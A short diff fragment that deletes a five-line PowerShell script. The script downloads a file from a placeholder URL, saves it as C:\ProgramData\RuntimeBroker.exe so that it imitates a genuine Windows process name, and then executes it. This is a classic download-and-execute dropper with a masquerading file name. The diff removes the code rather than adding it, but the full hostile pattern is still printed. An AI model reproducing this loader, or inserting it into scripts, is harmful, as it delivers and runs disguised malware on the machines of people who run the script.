@@ -1,5 +1,0 @@
-$filePath = "C:\ProgramData\RuntimeBroker.exe"
-$url = "URL" 
-Invoke-WebRequest -Uri $url -OutFile $filePath
-
-& $filePath
